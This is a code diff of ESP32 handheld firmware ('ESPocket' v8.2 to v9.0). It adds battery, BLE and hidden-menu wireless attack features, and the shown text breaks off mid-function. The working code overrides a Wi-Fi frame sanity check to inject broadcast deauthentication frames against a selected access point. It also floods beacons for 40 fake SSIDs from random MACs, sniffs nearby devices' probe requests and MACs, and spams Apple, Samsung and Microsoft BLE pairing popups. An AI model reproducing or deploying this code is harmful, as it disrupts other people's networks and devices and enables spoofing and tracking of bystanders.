@@ -1,4 +1,6 @@
-//  ESPocket v8.2 — Deauth bypass (raw frame sanity check override)
+// ============================================================
+//  ESPocket v9.0 — Final build
+//  WiFi + BT + IR + BLE + Battery + Games + Hidden Menu
 // ============================================================
 
 #include <Wire.h>
@@ -9,17 +11,17 @@
 #include <WiFi.h>
 #include "esp_wifi.h"
 #include "esp_wifi_types.h"
+#include <BLEDevice.h>
+#include <BLEScan.h>
+#include <BLEAdvertising.h>
 #include <IRremoteESP8266.h>
 #include <IRsend.h>
 #include <IRrecv.h>
 #include <IRutils.h>
 
-// ============================================================
-//  Deauth bypass — override ESP-IDF sanity check
-//  (requires -Wl,-zmuldefs in platformio.ini build_flags)
-// ============================================================
+// ---------- Deauth bypass (active on PlatformIO with -Wl,-zmuldefs) ----------
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
-  return 0;   // always allow — required for deauth frame injection
+  return 0;
 }
 
 #define OLED_SDA     21
@@ -36,7 +38,9 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
 #define IR_TX_PIN    13
 #define IR_RX_PIN    14
 
-#define TEMP_CRIT  85.0f
+#define BATT_ADC_PIN 34
+
+#define TEMP_CRIT    85.0f
 
 Adafruit_SSD1306 display(SCR_W, SCR_H, &Wire, -1);
 IRsend irsend(IR_TX_PIN);
@@ -59,10 +63,10 @@ enum Scene : uint8_t {
   S_HIDDEN, S_WIFI_H, S_BT_H, S_IR_H,
   S_WIFI_SCAN, S_WIFI_TARGET, S_MOCK,
   S_IR_LEARN, S_IR_LIST, S_IR_TX, S_IR_JAM, S_IR_TVBG,
-  S_DEAUTH
+  S_DEAUTH, S_BEACON, S_PROBE, S_RFMON,
+  S_BLE_SCAN, S_BLE_SPAM, S_BLE_IBEACON
 };
 
-// ---------- Forward declarations (PlatformIO strict C++) ----------
 void goToScene(Scene s);
 bool touched(int pin, int baseline);
 
@@ -86,7 +90,7 @@ Song SONGS[] = {
 const int SONG_COUNT = 4;
 int songSel = 0;
 
-// ---------- BT ----------
+// ---------- BT (mock) ----------
 const char* BT_M[] = {"Scan Devices","Connect Last","Forget Saved"};
 const int BT_M_COUNT = 3;
 int btMenuSel = 0;
@@ -134,7 +138,6 @@ int highScore = 0;
 struct IRCode { bool valid; uint8_t protocol; uint32_t code; uint8_t bits; char name[IR_NAME_LEN]; };
 IRCode irSlots[IR_MAX_SLOTS];
 int irSel = 0, irLearnSlot = 0, irListSel = 0, irLastSlot = 0;
-
 bool irJamming = false;
 unsigned long irJamStart = 0, irJamCount = 0, irJamLastSend = 0;
 uint8_t irJamProtoIdx = 0;
@@ -146,62 +149,118 @@ const int IR_PROTO_COUNT = 6;
 const char* IR_MENU[] = {"Learn Code","Transmit","Jammer","TV-B-Gone","Delete Slot"};
 const int IR_MENU_COUNT = 5;
 
-// ---------- Hidden menu ----------
+// ---------- Hidden ----------
 bool hiddenUnlocked = false;
 const char* HIDDEN_IT[]  = {"WiFi","BT","IR"};
 const char* HIDDEN_SUB[] = {"Wireless","Bluetooth","Infrared"};
 const int HIDDEN_COUNT = 3;
 int hiddenSel = 0;
+
 const char* WIFI_H_M[] = {"Scan Networks","Beacon Spam","Probe Sniffer","RF Monitor"};
 const int WIFI_H_COUNT = 4;
 int wifiHSel = 0;
-const char* BT_H_M[] = {"BLE Scan","BLE Spam","HID Keyboard"};
-const int BT_H_COUNT = 3;
+
+const char* BT_H_M[] = {"BLE Scan","BLE Spam","iBeacon","HID Keyboard"};
+const int BT_H_COUNT = 4;
 int btHSel = 0;
 
 // ---------- WiFi nets ----------
 #define NET_MAX 20
-struct Net {
-  char ssid[33];
-  uint8_t bssid[6];
-  int8_t rssi;
-  uint8_t ch;
-  bool locked;
-};
+struct Net { char ssid[33]; uint8_t bssid[6]; int8_t rssi; uint8_t ch; bool locked; };
 Net NETS[NET_MAX];
 int NET_COUNT = 0;
 int netSel = 0, targetNet = 0;
 bool wifiScanDone = false;
 bool wifiScanRunning = false;
 
-// ---------- Deauth ----------
-bool deauthRunning = false;
-unsigned long deauthStartMs = 0;
-unsigned long deauthLast = 0;
-unsigned long deauthCount = 0;
-#define DEAUTH_REASON 0x07
-
 const char* WIFI_ACT_M[] = {"Deauth","Evil Twin","Beacon Spoof","Probe Flood"};
 const int WIFI_ACT_COUNT = 4;
 int wifiActSel = 0;
 
+// ---------- Deauth ----------
+bool deauthRunning = false;
+unsigned long deauthStartMs = 0, deauthLast = 0, deauthCount = 0;
+#define DEAUTH_REASON 0x07
+
+// ---------- Beacon ----------
+bool beaconRunning = false;
+unsigned long beaconStartMs = 0, beaconLast = 0, beaconCount = 0;
+int beaconSSIDIdx = 0;
+uint8_t beaconMac[6];
+const char* FAKE_SSIDS[] = {
+  "JioFiber_Home","Airtel_Home","ACT_Fibernet","BSNL_Broadband",
+  "TP-Link_2G","TP-Link_5G","Tenda_WiFi","D-Link_Router",
+  "Hathway_WiFi","Excitel_Home","GTPL_Kabel","DEN_Broadband",
+  "AndroidAP","Redmi_Note","Realme_5G","OnePlus_Nord",
+  "Moto_G_AP","Vivo_Y21","Oppo_A5","Samsung_A52",
+  "Home_WiFi","My_Home","Ghar_Ka_WiFi","Family_WiFi",
+  "Wifi_Zone","Home_Network","Guest_WiFi","WiFi@Home",
+  "Dad_Ka_WiFi","Mummy_WiFi","Bhai_Ka_WiFi","Study_Room",
+  "Flat_101","Flat_202","Apartment_5G","Tower_A_WiFi",
+  "Building_Net","Society_WiFi","My_Home_2.4G","My_Home_5G"
+};
+const int FAKE_SSID_COUNT = 40;
+
+// ---------- Probe Sniffer ----------
+#define PROBE_RING 8
+volatile uint8_t probeRingMac[PROBE_RING][6];
+volatile int8_t  probeRingRssi[PROBE_RING];
+volatile char    probeRingSsid[PROBE_RING][24];
+volatile bool    probeRingValid[PROBE_RING];
+volatile int     probeRingHead = 0;
+volatile bool    snifferActive = false;
+
+#define PROBE_MAX 20
+struct ProbeDev {
+  uint8_t mac[6];
+  char ssid[24];
+  int8_t rssi;
+  uint16_t count;
+  unsigned long lastSeen;
+  bool used;
+};
+ProbeDev probeDevices[PROBE_MAX];
+int probeDevCount = 0;
+uint32_t probeTotalCount = 0;
+
+// ---------- RF Monitor ----------
+int rfNetworkCount = 0, rfAvgRssi = 0, rfStrongest = -100, rfWeakest = -100;
+unsigned long rfLastScanMs = 0;
+uint8_t rfChanUsage[14] = {0};
+bool rfScanRunning = false;
+
+// ---------- BLE ----------
+#define BLE_MAX_DEVS 15
+struct BLEDevInfo { char name[24]; uint8_t addr[6]; int rssi; };
+BLEDevInfo bleDevs[BLE_MAX_DEVS];
+int bleDevCount = 0, bleSel = 0;
+bool bleScanDone = false, bleScanRunning = false;
+bool bleSpamRunning = false;
+unsigned long bleSpamStart = 0, bleSpamLast = 0, bleSpamCount = 0;
+int bleSpamType = 0;
+bool bleIbRunning = false;
+unsigned long bleIbStart = 0;
+BLEScan* bleScan = nullptr;
+bool bleStackInit = false;
+
+// ---------- Mock attack screen ----------
 const char* mockTitle = "";
 const char* mockSub   = "";
 Scene mockReturnScene = S_HIDDEN;
 
-// Konami
+// ---------- Konami ----------
 int konamiProgress = 0;
 unsigned long konamiLastMs = 0;
 const int KONAMI_CODE[] = {0,1,0,1,2};
 const int KONAMI_LEN = 5;
 
-// Touch
+// ---------- Touch ----------
 int baseUp=0, baseDown=0, baseSelect=0, baseBack=0;
 #define TOUCH_DROP_PCT 25
 unsigned long lastInput = 0;
 #define INPUT_DEBOUNCE 30
 
-// Smooth
+// ---------- Smooth ----------
 #define SMOOTH_RATE 14.0f
 float smPos = 0.0f;
 unsigned long smLastMs = 0;
@@ -210,6 +269,11 @@ float lerpf(float a,float b,float t){return a+(b-a)*t;}
 void smTick(float t){unsigned long n=millis();if(smFirst){smPos=t;smLastMs=n;smFirst=false;return;}float dt=(n-smLastMs)/1000.0f;if(dt>0.08f)dt=0.08f;float k=1.0f-expf(-SMOOTH_RATE*dt);smPos=lerpf(smPos,t,k);smLastMs=n;}
 void smSnapNext(){smFirst=true;}
 int animFrame = 0;
+
+// ---------- Battery ----------
+int batteryPct = 0;
+unsigned long lastBattRead = 0;
+float battVoltage = 0.0f;
 
 // ---------- Icons ----------
 void iPlay(int x,int y,uint16_t c){display.fillTriangle(x+2,y+1,x+2,y+7,x+7,y+4,c);}
@@ -232,15 +296,37 @@ void iGearL(int x,int y,uint16_t c){display.drawCircle(x+8,y+8,4,c);display.draw
 void iWifi(int x,int y,uint16_t c){display.fillCircle(x+4,y+6,1,c);display.drawCircle(x+4,y+6,3,c);display.drawCircle(x+4,y+6,5,c);}
 void iWifiL(int x,int y,uint16_t c){display.fillCircle(x+8,y+12,2,c);display.drawCircle(x+8,y+12,5,c);display.drawCircle(x+8,y+12,9,c);}
 
-// Header
-int batteryPct = 78;
+// ---------- Header + battery ----------
 void batD(int x,int y){display.drawRect(x,y,16,9,BLACK);display.fillRect(x+16,y+3,2,3,BLACK);int f=(batteryPct*12)/100;if(f>0)display.fillRect(x+2,y+2,f,5,BLACK);}
 void batL(int x,int y){display.drawRect(x,y,16,9,WHITE);display.fillRect(x+16,y+3,2,3,WHITE);int f=(batteryPct*12)/100;if(f>0)display.fillRect(x+2,y+2,f,5,WHITE);}
 void hdr(const char* t){int tw=strlen(t)*6;int hx=(SCR_W-(tw+8))/2;display.fillRoundRect(hx,0,tw+8,13,6,WHITE);display.setTextColor(BLACK);display.setTextSize(1);display.setCursor(hx+4,3);display.print(t);batD(SCR_W-22,2);display.setTextColor(WHITE);}
 void hdrL(const char* t){int tw=strlen(t)*6;int hx=(SCR_W-(tw+8))/2;display.drawRoundRect(hx,0,tw+8,13,6,WHITE);display.setTextColor(WHITE);display.setTextSize(1);display.setCursor(hx+4,3);display.print(t);batL(SCR_W-22,2);}
 void drawSignalBars(int x,int y,int s,uint16_t c){for(int i=0;i<4;i++){int h=2+i*2;int bx=x+i*3;int by=y-h+2;if(i<s)display.fillRect(bx,by,2,h,c);else display.drawRect(bx,by,2,h,c);}}
-float readTempC() { return temperatureRead(); }
+float readTempC(){return temperatureRead();}
 void saveHighScore(int score){if(score>highScore){highScore=score;prefs.putInt("hi",highScore);}}
+
+// ---------- Battery funcs ----------
+float readBatteryVoltage() {
+  uint32_t total = 0;
+  for (int i = 0; i < 32; i++) {
+    total += analogReadMilliVolts(BATT_ADC_PIN);
+    delay(5);
+  }
+  float mv = total / 32.0f;
+  return (mv * 2.0f) / 1000.0f;
+}
+
+void batteryUpdate() {
+  unsigned long now = millis();
+  if (now - lastBattRead < 2000) return;
+  lastBattRead = now;
+  battVoltage = readBatteryVoltage();
+  if (battVoltage < 1.0f) { batteryPct = 0; return; }
+  int pct = (int)((battVoltage - 3.0f) / 1.2f * 100.0f);
+  if (pct < 0) pct = 0;
+  if (pct > 100) pct = 100;
+  batteryPct = pct;
+}
 
 // ============================================================
 //  IR storage
@@ -330,52 +416,366 @@ void irSendTvbgCode(int idx){
 // ============================================================
 void deauthSendFrame(uint8_t* dst, uint8_t* src, uint8_t* bssid) {
   uint8_t frame[26];
-  frame[0] = 0xC0;
-  frame[1] = 0x00;
-  frame[2] = 0x00;
-  frame[3] = 0x00;
+  frame[0]=0xC0; frame[1]=0x00; frame[2]=0x00; frame[3]=0x00;
   memcpy(&frame[4],  dst,   6);
   memcpy(&frame[10], src,   6);
   memcpy(&frame[16], bssid, 6);
-  frame[22] = 0x00;
-  frame[23] = 0x00;
-  frame[24] = DEAUTH_REASON;
-  frame[25] = 0x00;
+  frame[22]=0x00; frame[23]=0x00;
+  frame[24]=DEAUTH_REASON; frame[25]=0x00;
   esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
 }
-
 void deauthRunOnce() {
   if (targetNet < 0 || targetNet >= NET_COUNT) return;
   uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
   uint8_t* ap = NETS[targetNet].bssid;
-  deauthSendFrame(bcast, ap, ap);
-  deauthSendFrame(bcast, ap, ap);
-  deauthSendFrame(bcast, ap, ap);
-  deauthSendFrame(bcast, ap, ap);
+  for (int i = 0; i < 4; i++) deauthSendFrame(bcast, ap, ap);
   deauthCount += 4;
 }
-
 void deauthStart(int netIdx) {
   if (netIdx < 0 || netIdx >= NET_COUNT) return;
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect();
-  delay(50);
+  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_channel(NETS[netIdx].ch, WIFI_SECOND_CHAN_NONE);
   delay(50);
-  deauthRunning = true;
-  deauthStartMs = millis();
-  deauthLast = 0;
-  deauthCount = 0;
+  deauthRunning = true; deauthStartMs = millis();
+  deauthLast = 0; deauthCount = 0;
   Serial.printf("[DEAUTH] started ch=%d\n", NETS[netIdx].ch);
 }
-
 void deauthStop() {
   deauthRunning = false;
   esp_wifi_set_promiscuous(false);
-  WiFi.mode(WIFI_OFF);
-  WiFi.disconnect(true);
+  WiFi.mode(WIFI_OFF); WiFi.disconnect(true);
   Serial.printf("[DEAUTH] stopped, %lu frames\n", deauthCount);
+}
+
+// ============================================================
+//  Beacon Spam
+// ============================================================
+int buildBeacon(uint8_t* buf, const char* ssid, uint8_t* srcMac) {
+  int idx = 0;
+  buf[idx++]=0x80; buf[idx++]=0x00; buf[idx++]=0x00; buf[idx++]=0x00;
+  for (int i = 0; i < 6; i++) buf[idx++] = 0xFF;
+  for (int i = 0; i < 6; i++) buf[idx++] = srcMac[i];
+  for (int i = 0; i < 6; i++) buf[idx++] = srcMac[i];
+  buf[idx++]=0x00; buf[idx++]=0x00;
+  for (int i = 0; i < 8; i++) buf[idx++] = 0x00;
+  buf[idx++]=0x64; buf[idx++]=0x00;
+  buf[idx++]=0x31; buf[idx++]=0x04;
+  int sl = strlen(ssid); if (sl > 32) sl = 32;
+  buf[idx++]=0x00; buf[idx++]=sl;
+  memcpy(&buf[idx], ssid, sl); idx += sl;
+  buf[idx++]=0x01; buf[idx++]=0x08;
+  buf[idx++]=0x82; buf[idx++]=0x84; buf[idx++]=0x8B; buf[idx++]=0x96;
+  buf[idx++]=0x0C; buf[idx++]=0x12; buf[idx++]=0x18; buf[idx++]=0x24;
+  buf[idx++]=0x03; buf[idx++]=0x01; buf[idx++]=0x06;
+  return idx;
+}
+void sendBeaconSpam() {
+  uint8_t frame[128];
+  for (int i = 0; i < 3; i++) {
+    const char* ssid = FAKE_SSIDS[beaconSSIDIdx % FAKE_SSID_COUNT];
+    beaconMac[0]=0x02;
+    beaconMac[1]=random(0,256); beaconMac[2]=random(0,256);
+    beaconMac[3]=random(0,256); beaconMac[4]=random(0,256);
+    beaconMac[5]=random(0,256);
+    int len = buildBeacon(frame, ssid, beaconMac);
+    esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
+    beaconCount++; beaconSSIDIdx++;
+  }
+}
+void beaconStart() {
+  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+  delay(50);
+  beaconRunning = true; beaconStartMs = millis();
+  beaconLast = 0; beaconCount = 0; beaconSSIDIdx = 0;
+  Serial.println("[BEACON] started");
+}
+void beaconStop() {
+  beaconRunning = false;
+  esp_wifi_set_promiscuous(false);
+  WiFi.mode(WIFI_OFF); WiFi.disconnect(true);
+  Serial.printf("[BEACON] stopped, %lu frames\n", beaconCount);
+}
+
+// ============================================================
+//  Probe Sniffer
+// ============================================================
+void IRAM_ATTR probeSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (type != WIFI_PKT_MGMT) return;
+  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+  if (pkt->rx_ctrl.sig_len < 24) return;
+  uint8_t* f = pkt->payload;
+  uint8_t subtype = (f[0] >> 4) & 0x0F;
+  if (subtype != 0x04) return;
+
+  int slot = probeRingHead;
+  for (int i = 0; i < 6; i++) probeRingMac[slot][i] = f[10 + i];
+  probeRingRssi[slot] = (int8_t)pkt->rx_ctrl.rssi;
+
+  int idx = 24, slen = pkt->rx_ctrl.sig_len;
+  probeRingSsid[slot][0] = 0;
+  while (idx + 2 <= slen) {
+    uint8_t tag = f[idx];
+    uint8_t len = f[idx + 1];
+    if (idx + 2 + len > slen) break;
+    if (tag == 0x00 && len > 0 && len < 24) {
+      for (int i = 0; i < len; i++) probeRingSsid[slot][i] = (char)f[idx + 2 + i];
+      probeRingSsid[slot][len] = 0;
+      break;
+    }
+    idx += 2 + len;
+  }
+  probeRingValid[slot] = true;
+  probeRingHead = (probeRingHead + 1) % PROBE_RING;
+}
+
+void probeProcessRing() {
+  for (int s = 0; s < PROBE_RING; s++) {
+    if (!probeRingValid[s]) continue;
+    probeRingValid[s] = false;
+    uint8_t mac[6]; int8_t rssi = probeRingRssi[s];
+    char ssid[24];
+    for (int i = 0; i < 6; i++) mac[i] = probeRingMac[s][i];
+    for (int i = 0; i < 24; i++) ssid[i] = probeRingSsid[s][i];
+    ssid[23] = 0;
+    probeTotalCount++;
+
+    int found = -1;
+    for (int i = 0; i < PROBE_MAX; i++) {
+      if (!probeDevices[i].used) continue;
+      if (memcmp(probeDevices[i].mac, mac, 6) == 0) { found = i; break; }
+    }
+    if (found >= 0) {
+      probeDevices[found].count++;
+      probeDevices[found].rssi = rssi;
+      probeDevices[found].lastSeen = millis();
+      if (ssid[0]) { strncpy(probeDevices[found].ssid, ssid, 23); probeDevices[found].ssid[23] = 0; }
+    } else {
+      int free = -1;
+      for (int i = 0; i < PROBE_MAX; i++) if (!probeDevices[i].used) { free = i; break; }
+      if (free >= 0) {
+        memcpy(probeDevices[free].mac, mac, 6);
+        strncpy(probeDevices[free].ssid, ssid, 23);
+        probeDevices[free].ssid[23] = 0;
+        probeDevices[free].rssi = rssi;
+        probeDevices[free].count = 1;
+        probeDevices[free].lastSeen = millis();
+        probeDevices[free].used = true;
+        probeDevCount++;
+      }
+    }
+  }
+}
+
+void snifferStart() {
+  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
+  esp_wifi_set_promiscuous_rx_cb(probeSnifferCb);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
+  snifferActive = true;
+  probeDevCount = 0; probeTotalCount = 0; probeRingHead = 0;
+  for (int i = 0; i < PROBE_MAX; i++) probeDevices[i].used = false;
+  for (int i = 0; i < PROBE_RING; i++) probeRingValid[i] = false;
+  Serial.println("[PROBE] started");
+}
+void snifferStop() {
+  snifferActive = false;
+  esp_wifi_set_promiscuous(false);
+  WiFi.mode(WIFI_OFF); WiFi.disconnect(true);
+  Serial.printf("[PROBE] stopped, %lu total, %d devs\n", (unsigned long)probeTotalCount, probeDevCount);
+}
+
+// ============================================================
+//  RF Monitor (async)
+// ============================================================
+void rfMonitorScan() {
+  unsigned long now = millis();
+  if (!rfScanRunning) {
+    if (now - rfLastScanMs < 5000) return;
+    rfLastScanMs = now;
+    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(10);
+    WiFi.scanNetworks(true, false);
+    rfScanRunning = true;
+    return;
+  }
+  int n = WiFi.scanComplete();
+  if (n < 0) return;
+
+  rfNetworkCount = n;
+  rfStrongest = -100; rfWeakest = -100; rfAvgRssi = 0;
+  for (int i = 0; i < 14; i++) rfChanUsage[i] = 0;
+  if (n > 0) {
+    int sum = 0;
+    for (int i = 0; i < n; i++) {
+      int r = WiFi.RSSI(i); sum += r;
+      if (r > rfStrongest) rfStrongest = r;
+      if (r < rfWeakest || rfWeakest == -100) rfWeakest = r;
+      int ch = WiFi.channel(i);
+      if (ch >= 1 && ch <= 14) rfChanUsage[ch - 1]++;
+    }
+    rfAvgRssi = sum / n;
+  }
+  WiFi.scanDelete();
+  WiFi.mode(WIFI_OFF); WiFi.disconnect(true);
+  rfScanRunning = false;
+}
+
+// ============================================================
+//  BLE
+// ============================================================
+class BLEAdvertisedCallbacks : public BLEAdvertisedDeviceCallbacks {
+  void onResult(BLEAdvertisedDevice dev) {
+    if (bleDevCount >= BLE_MAX_DEVS) return;
+    String name = dev.getName().c_str();
+    if (name.length() == 0) return;
+    strncpy(bleDevs[bleDevCount].name, name.c_str(), 23);
+    bleDevs[bleDevCount].name[23] = 0;
+    BLEAddress addr = dev.getAddress();
+    uint8_t* a = addr.getNative();
+    for (int i = 0; i < 6; i++) bleDevs[bleDevCount].addr[i] = a[i];
+    bleDevs[bleDevCount].rssi = dev.getRSSI();
+    bleDevCount++;
+  }
+};
+
+void bleEnsureInit() {
+  if (bleStackInit) return;
+  BLEDevice::init("ESPocket");
+  bleStackInit = true;
+  Serial.println("[BLE] stack init");
+}
+void bleDeinit() {
+  if (!bleStackInit) return;
+  BLEDevice::deinit(true);
+  bleStackInit = false;
+  bleScan = nullptr;
+  Serial.println("[BLE] stack deinit");
+}
+
+void bleStartScan() {
+  WiFi.mode(WIFI_OFF); WiFi.disconnect(true); delay(50);
+  bleEnsureInit();
+  bleDevCount = 0; bleSel = 0;
+  bleScanDone = false; bleScanRunning = true;
+  if (!bleScan) bleScan = BLEDevice::getScan();
+  bleScan->setAdvertisedDeviceCallbacks(new BLEAdvertisedCallbacks());
+  bleScan->setActiveScan(true);
+  bleScan->setInterval(100);
+  bleScan->setWindow(80);
+  bleScan->start(3, false);
+  Serial.println("[BLE] scan started");
+}
+
+void bleSendApplePopup() {
+  BLEAdvertisementData advData;
+  advData.setFlags(0x06);
+  String mfg;
+  mfg += (char)0x4C; mfg += (char)0x00;
+  mfg += (char)0x07; mfg += (char)0x19; mfg += (char)0x01;
+  mfg += (char)random(0, 256); mfg += (char)random(0, 256);
+  mfg += (char)random(0, 256);
+  mfg += (char)0x00; mfg += (char)0x00;
+  advData.setManufacturerData(mfg);
+  BLEAdvertising* adv = BLEDevice::getAdvertising();
+  adv->setAdvertisementData(advData);
+  adv->start(); delay(8); adv->stop();
+  bleSpamCount++;
+}
+
+void bleSendSamsungPopup() {
+  BLEAdvertisementData advData;
+  advData.setFlags(0x06);
+  String mfg;
+  mfg += (char)0x75; mfg += (char)0x00;
+  mfg += (char)0x01; mfg += (char)0x00;
+  mfg += (char)random(0, 256); mfg += (char)random(0, 256);
+  advData.setManufacturerData(mfg);
+  BLEAdvertising* adv = BLEDevice::getAdvertising();
+  adv->setAdvertisementData(advData);
+  adv->start(); delay(8); adv->stop();
+  bleSpamCount++;
+}
+
+void bleSendMicrosoftPopup() {
+  BLEAdvertisementData advData;
+  advData.setFlags(0x06);
+  String mfg;
+  mfg += (char)0x06; mfg += (char)0x00;
+  mfg += (char)0x03; mfg += (char)0x00;
+  mfg += (char)0x80;
+  advData.setManufacturerData(mfg);
+  advData.setName("Swift Pair");
+  BLEAdvertising* adv = BLEDevice::getAdvertising();
+  adv->setAdvertisementData(advData);
+  adv->start(); delay(8); adv->stop();
+  bleSpamCount++;
+}
+
+void bleStartSpam() {
+  WiFi.mode(WIFI_OFF); WiFi.disconnect(true); delay(50);
+  bleEnsureInit();
+  bleSpamRunning = true;
+  bleSpamStart = millis(); bleSpamLast = 0;
+  bleSpamCount = 0; bleSpamType = 0;
+  Serial.println("[BLE] spam started");
+}
+void bleSpamTick() {
+  unsigned long now = millis();
+  if (now - bleSpamLast < 20) return;
+  bleSpamLast = now;
+  switch (bleSpamType) {
+    case 0: bleSendApplePopup();     break;
+    case 1: bleSendSamsungPopup();   break;
+    case 2: bleSendMicrosoftPopup(); break;
+  }
+  bleSpamType = (bleSpamType + 1) % 3;
+  if (bleSpamCount % 30 == 0) {
+    esp_bd_addr_t randAddr;
+    for (int i = 0; i < 6; i++) randAddr[i] = random(0, 256);
+    esp_ble_gap_set_rand_addr(randAddr);
+  }
+}
+void bleStopSpam() {
+  BLEAdvertising* adv = BLEDevice::getAdvertising();
+  adv->stop();
+  bleSpamRunning = false;
+  Serial.printf("[BLE] spam stopped, %lu packets\n", bleSpamCount);
+  bleDeinit();
+}
+
+void bleStartIBeacon() {
+  WiFi.mode(WIFI_OFF); WiFi.disconnect(true); delay(50);
+  bleEnsureInit();
+  bleIbRunning = true; bleIbStart = millis();
+
+  BLEAdvertisementData advData;
+  advData.setFlags(0x06);
+  String mfg;
+  mfg += (char)0x4C; mfg += (char)0x00;
+  mfg += (char)0x02; mfg += (char)0x15;
+  const uint8_t uuid[16] = {
+    0xE2,0xC5,0x6D,0xB5,0xDF,0xFB,0x48,0xD2,
+    0xB0,0x60,0xD0,0xF5,0xA7,0x10,0x96,0xE0
+  };
+  for (int i = 0; i < 16; i++) mfg += (char)uuid[i];
+  mfg += (char)0x00; mfg += (char)0x01;
+  mfg += (char)0x00; mfg += (char)0x01;
+  mfg += (char)0xC5;
+  advData.setManufacturerData(mfg);
+
+  BLEAdvertising* adv = BLEDevice::getAdvertising();
+  adv->setAdvertisementData(advData);
+  adv->start();
+  Serial.println("[BLE] iBeacon started");
+}
+void bleStopIBeacon() {
+  BLEAdvertising* adv = BLEDevice::getAdvertising();
+  adv->stop();
+  bleIbRunning = false;
+  Serial.println("[BLE] iBeacon stopped");
+  bleDeinit();
 }
 
 // ============================================================
@@ -770,7 +1170,7 @@ void dAbout() {
   hdrL("ABOUT");
   display.setTextSize(1); display.setTextColor(WHITE);
   lastTempC = readTempC();
-  display.setCursor(4, 16); display.print("ESPocket v8.2");
+  display.setCursor(4, 16); display.print("ESPocket v9.0");
   display.setCursor(4, 26); display.print("ESP32-WROOM-32");
   display.setCursor(4, 36); display.print("Temp: "); display.print(lastTempC, 1); display.print(" C");
   unsigned long up=(millis()-bootMs)/1000UL;
@@ -860,7 +1260,6 @@ void dWifiScan() {
 
   if (!wifiScanDone) {
     int n = WiFi.scanComplete();
-
     display.clearDisplay();
     hdrL("SCANNING");
     int cx=SCR_W/2, cy=34;
@@ -905,8 +1304,7 @@ void dWifiScan() {
       wifiScanRunning = false;
       netSel = 0;
       Serial.printf("[WIFI] scan done, %d nets\n", NET_COUNT);
-      WiFi.mode(WIFI_OFF);
-      WiFi.disconnect(true);
+      WiFi.mode(WIFI_OFF); WiFi.disconnect(true);
       smSnapNext();
       sceneStartMs = millis();
     }
@@ -991,18 +1389,15 @@ void dDeauth() {
   display.clearDisplay();
   hdr("DEAUTH");
   display.setTextSize(1);display.setTextColor(WHITE);
-  display.setCursor(2,14);
-  display.print("TGT: ");
+  display.setCursor(2,14); display.print("TGT: ");
   if (targetNet >= 0 && targetNet < NET_COUNT) {
     char b[18]; snprintf(b,sizeof(b),"%.16s",NETS[targetNet].ssid);
     display.print(b);
   }
-  display.setCursor(2,26);
-  display.print("Ch: ");
+  display.setCursor(2,26); display.print("Ch: ");
   if (targetNet >= 0 && targetNet < NET_COUNT) display.print(NETS[targetNet].ch);
   display.setCursor(2,38);
-  char fb[24];
-  snprintf(fb,sizeof(fb),"Frames: %lu",deauthCount);
+  char fb[24]; snprintf(fb,sizeof(fb),"Frames: %lu",deauthCount);
   display.print(fb);
   unsigned long el = (now - deauthStartMs) / 1000;
   display.setCursor(2,50);
@@ -1018,6 +1413,194 @@ void dDeauth() {
     deauthLast = now;
     for (int i = 0; i < 5; i++) deauthRunOnce();
   }
+}
+
+void dBeacon() {
+  unsigned long now = millis();
+  display.clearDisplay();
+  hdr("BEACON");
+  display.setTextSize(1); display.setTextColor(WHITE);
+  display.setCursor(2, 14); display.print("SSID: ");
+  display.print(FAKE_SSIDS[beaconSSIDIdx % FAKE_SSID_COUNT]);
+  display.setCursor(2, 26);
+  char b[24]; snprintf(b, sizeof(b), "Sent: %lu", beaconCount);
+  display.print(b);
+  unsigned long el = (now - beaconStartMs) / 1000;
+  display.setCursor(2, 38);
+  if (el > 0) { snprintf(b, sizeof(b), "Rate: %lu/s", beaconCount / el); display.print(b); }
+  display.setCursor(2, 50);
+  snprintf(b, sizeof(b), "Time: %lus", el);
+  display.print(b);
+  if ((animFrame/3)%2==0) { display.fillCircle(SCR_W-8, 6, 3, WHITE); display.drawCircle(SCR_W-8, 6, 6, WHITE); }
+  else                    { display.drawCircle(SCR_W-8, 6, 3, WHITE); display.drawCircle(SCR_W-8, 6, 6, WHITE); }
+  display.setCursor(2, 58); display.print("BACK = stop");
+  display.display();
+  if (now - beaconLast >= 20) {
+    beaconLast = now;
+    for (int i = 0; i < 5; i++) sendBeaconSpam();
+    static uint8_t beaconChIdx = 0;
+    static uint32_t beaconHopCount = 0;
+    beaconHopCount++;
+    if (beaconHopCount % 30 == 0) {
+      beaconChIdx = (beaconChIdx + 1) % 3;
+      uint8_t chs[3] = {1, 6, 11};
+      esp_wifi_set_channel(chs[beaconChIdx], WIFI_SECOND_CHAN_NONE);
+    }
+  }
+}
+
+void dProbe() {
+  if (snifferActive) probeProcessRing();
+  static unsigned long lastHop = 0;
+  static uint8_t hopIdx = 0;
+  if (snifferActive && millis() - lastHop > 500) {
+    lastHop = millis();
+    uint8_t chs[3] = {1, 6, 11};
+    hopIdx = (hopIdx + 1) % 3;
+    esp_wifi_set_channel(chs[hopIdx], WIFI_SECOND_CHAN_NONE);
+  }
+  display.clearDisplay();
+  hdr("PROBE SNIFF");
+  display.setTextSize(1); display.setTextColor(WHITE);
+  char sb[32]; snprintf(sb, sizeof(sb), "Dev:%d  Tot:%lu", probeDevCount, (unsigned long)probeTotalCount);
+  display.setCursor(2, 14); display.print(sb);
+  int startIdx = 0;
+  if (probeDevCount > 3) startIdx = probeDevCount - 3;
+  int rowY = 25;
+  for (int i = startIdx; i < probeDevCount && rowY < 56; i++) {
+    int j = -1, seen = 0;
+    for (int k = 0; k < PROBE_MAX; k++) {
+      if (probeDevices[k].used) { if (seen == i) { j = k; break; } seen++; }
+    }
